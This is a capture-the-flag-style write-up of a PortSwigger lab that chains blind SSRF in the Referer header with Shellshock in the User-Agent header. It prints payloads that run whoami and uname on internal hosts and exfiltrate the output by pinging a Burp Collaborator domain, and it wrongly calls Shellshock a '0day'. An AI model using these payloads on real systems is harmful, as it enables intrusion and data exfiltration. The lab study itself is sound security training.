# Blind SSRF + Shellshock write up

Chain with [ShellShock](https://nvd.nist.gov/vuln/detail/CVE-2014-6271#match-7146748) 

### Overview

### **Overview of SSRF**

Server Side Request Forgery (SSRF) is a type of vulnerability where an attacker is able to get a server to make requests to other internal or external resources. The attacker can then use this vulnerability to gain access to sensitive information, such as passwords, or to launch further attacks, such as remote code execution.

**Overview of Shellshock**

Shellshock is a vulnerability in the bash shell, which is used in many Linux and Unix systems. It allows for remote code execution, which can be used to gain access to a system or launch further attacks. The vulnerability is caused by a flaw in the implementation of environment variables in Bash, which allows code to be executed without prior authentication.

1. **Discover**

```html
https://[ID].web-security-academy.net/product?productId=1
```

The lab present a shop that vulnerable to SSRF but in blind case ( OAST technique ). From the main page of the shop, when we click on the details of the product, we can see more information about the product in the other endpoint. From Burp, we can see those fields is included inside the request.

![Untitled](Blind%20SSRF%20+%20Shellshock%20write%20up%20830de68b34d84d15a8df5e90c3ddfcaa/Untitled.png)

And referrer field is the thing we want to pay attention because in SSRF of this type, which is local infiltration. 

1. **Attack Vectors**

We may want to try to make a connection to our own server which is provided by Burp Collaborator to see whether the requests are made through. 

![Untitled](Blind%20SSRF%20+%20Shellshock%20write%20up%20830de68b34d84d15a8df5e90c3ddfcaa/Untitled%201.png)

We locate to the referrer field and place a link provided by Burp Collaborator, make a request and poll on the panel, we saw the following result.

![Untitled](Blind%20SSRF%20+%20Shellshock%20write%20up%20830de68b34d84d15a8df5e90c3ddfcaa/Untitled%202.png)

Prove that the referrer field can make a connection to the outside server, which is potentially to SSRF, and surely nothing is come back from the response of the first request we made.

1. Step to reproduce 
    
    > From the lab, it require us to perform task that attack to the internal server located in the range of 192.168.0.[IP]:8080.
    > 

From this time, we totally can made a request to the outside through referrer field. So, the question we need to answer right now is ***how to perform an IP scanner while making request of that IP to the outside server which we owned ( in this case is Burp Collaborator ).***

Hint from the lab: Shellshock payload

Back to the request we made at the moment. We may want to exploit with the help of [Shellshock](https://nvd.nist.gov/vuln/detail/CVE-2014-6271#match-7146748).

![Untitled](Vulnerability%20Report%20on%20SSRF%20chain%20with%20Shellshock%20e69fb6b27fb74614b00c32980e5c7ba9/Untitled.png)

```bash
env x='() { :;}; echo vulnerable' bash -c "echo test"
```

Sample PoC suggest that the field we want to drop the command will we parsed by the Bash and due to that behavior, it will make a connection to the outside world with the deserved command. Similar to OS command injection but in this case, it chain with a 0day vulnerable to successful exploit the target. Noted from the discover above, the 2nd request to burp collab link contains User-Agent field, which is then be logged by the http service running on the machine in the internal network.

![Untitled](Vulnerability%20Report%20on%20SSRF%20chain%20with%20Shellshock%20e69fb6b27fb74614b00c32980e5c7ba9/Untitled%201.png)

In this case, referrer should be the place we want to put the IP range that provided from the lab for scanning, this will be the 1st request. The 2nd request will come from the IP that expose to the WWW, and inside this 2nd request, User-Agent field should be use as the place the shockshell perform the task, which it run the command and make a connection to the outside server we owned. The process will look like diagram below:

![Untitled Diagram.drawio (1).png](Vulnerability%20Report%20on%20SSRF%20chain%20with%20Shellshock%20e69fb6b27fb74614b00c32980e5c7ba9/Untitled_Diagram.drawio_(1).png)

```bash
User-Agent: () { exp;}; echo; /usr/bin/ping $(whoami).[IP].oastify.com
```

Transfer the request to intruder, set range of the IP from 1-255 and put the payload we already prepare.

![Untitled](Vulnerability%20Report%20on%20SSRF%20chain%20with%20Shellshock%20e69fb6b27fb74614b00c32980e5c7ba9/Untitled%202.png)

Proved that every request is possible due to 200 response. But we want a connection to the outside world from the internal machine of the lab. Polled in Burp Collaborator:

![Untitled](Vulnerability%20Report%20on%20SSRF%20chain%20with%20Shellshock%20e69fb6b27fb74614b00c32980e5c7ba9/Untitled%203.png)

We saw that we receive 4 difference IP address that make the same task which ping to the domain we take from burp collaborator. Prove that the theory answered the question we made before. And it also prove that we can infiltrate the internal space through the chain of SSRF and Shellshock 0day vulnerable.

To solve the lab, just take the name of the machine, which is performed by `$(whoami)` and append to the burp collab link.

We can run difference command to infiltrate the internal service

![Untitled](Vulnerability%20Report%20on%20SSRF%20chain%20with%20Shellshock%20e69fb6b27fb74614b00c32980e5c7ba9/Untitled%204.png)

```bash
User-Agent: () { exp;}; echo; /usr/bin/ping $(uname).[IP].oastify.com
```